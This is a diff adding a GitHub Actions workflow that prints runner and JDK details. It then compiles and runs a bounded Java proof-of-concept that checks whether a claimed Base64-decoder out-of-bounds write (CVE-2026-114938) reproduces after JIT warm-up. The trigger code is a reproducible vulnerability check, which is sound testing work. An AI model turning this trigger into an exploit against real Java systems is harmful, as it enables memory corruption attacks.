@@ -1,0 +1,119 @@
+name: Java4Shell Runner Check
+on: [push, workflow_dispatch]
+
+jobs:
+  check:
+    runs-on: ubuntu-latest
+    steps:
+      - name: System info
+        run: |
+          echo "=== Runner info ==="
+          uname -a
+          echo ""
+          echo "=== CPU flags ==="
+          grep -m1 '^flags' /proc/cpuinfo | tr ' ' '\n' | grep -E "avx512|bmi2" || echo "no avx512/bmi2"
+          echo ""
+          echo "=== Java versions available ==="
+          ls /usr/lib/jvm/ 2>/dev/null || echo "no /usr/lib/jvm"
+          which java && java -version 2>&1 || echo "no java in PATH"
+
+      - name: Setup JDK 21 (Temurin)
+        uses: actions/setup-java@v4
+        with:
+          distribution: 'temurin'
+          java-version: '21'
+
+      - name: Check JDK version
+        run: |
+          echo "=== Active JDK ==="
+          java -version 2>&1
+          echo ""
+          echo "=== JAVA_HOME ==="
+          echo $JAVA_HOME
+          echo ""
+          echo "=== Full version string ==="
+          java -XshowSettings:properties -version 2>&1 | grep -E "java.version|java.runtime.version|java.vendor"
+
+      - name: Bounded PoC (safe, in-bounds)
+        run: |
+          cat > BoundedPoC.java <<'JAVA'
+          import java.util.Arrays;
+          import java.util.Base64;
+
+          public class BoundedPoC {
+              public static void main(String[] args) {
+                  System.out.println("Java version: " + System.getProperty("java.version"));
+                  System.out.println("Vendor: " + System.getProperty("java.vendor"));
+                  System.out.println("CPU arch: " + System.getProperty("os.arch"));
+
+                  // Check if AVX-512 is available
+                  String cpuFeatures = System.getProperty("sun.cpu.isalist", "unknown");
+                  System.out.println("CPU features (isalist): " + cpuFeatures);
+
+                  // Bounded PoC: decode into a 4096-byte buffer, count changes
+                  int n = 64; // trigger length
+                  Base64.Decoder dec = Base64.getDecoder();
+
+                  byte[] valid = new byte[n];
+                  for (int i = 0; i < n; i++) valid[i] = 65; // 'A'
+
+                  byte[] malformed = new byte[n + 1];
+                  for (int i = 0; i < n; i++) malformed[i] = 65;
+                  malformed[n] = 61; // '='
+
+                  byte[] target = new byte[4096];
+                  for (int i = 0; i < 4096; i++) target[i] = (byte)0x5a;
+
+                  // Warm up to trigger JIT
+                  for (int i = 0; i < 300000; i++) {
+                      dec.decode(valid, target);
+                  }
+
+                  // Fill target
+                  Arrays.fill(target, (byte)0x5a);
+
+                  // Strike
+                  boolean rejected = false;
+                  try { dec.decode(malformed, target); }
+                  catch (IllegalArgumentException e) { rejected = true; }
+
+                  // Count changes
+                  int v = 3 * n / 4 + 2;
+                  int changed = 0, first = -1, last = -1;
+                  for (int i = v; i < target.length; i++) {
+                      if (target[i] != (byte)0x5a) {
+                          changed++;
+                          if (first < 0) first = i;
+                          last = i;
+                      }
+                  }
+
+                  System.out.println("rejected=" + rejected);
+                  System.out.println("changed=" + changed + " first=" + first + " last=" + last + " (v=" + v + ")");
+
+                  if (changed == 62 && first == v) {
+                      System.out.println("RESULT: VULNERABLE (62-byte OOB signature)");
+                      System.out.println("CVE-2026-114938 reproduces on this runner");
+                  } else if (changed == 0) {
+                      System.out.println("RESULT: NOT VULNERABLE (no OOB detected)");
+                  } else {
+                      System.out.println("RESULT: INCONCLUSIVE (changed=" + changed + ")");
+                  }
+              }
+          }
+          JAVA
+
+          javac BoundedPoC.java
+          echo "=== Running bounded PoC ==="
+          java -XX:-TieredCompilation -XX:-BackgroundCompilation BoundedPoC 2>&1 || java BoundedPoC 2>&1
+
+      - name: Also test with default runner JDK
+        run: |
+          # Test the pre-installed JDK too (might differ from setup-java)
+          echo "=== Pre-installed JDKs ==="
+          for jvm in /usr/lib/jvm/*/bin/java; do
+              if [ -x "$jvm" ]; then
+                  echo "--- $jvm ---"
+                  "$jvm" -version 2>&1
+              fi
+          done
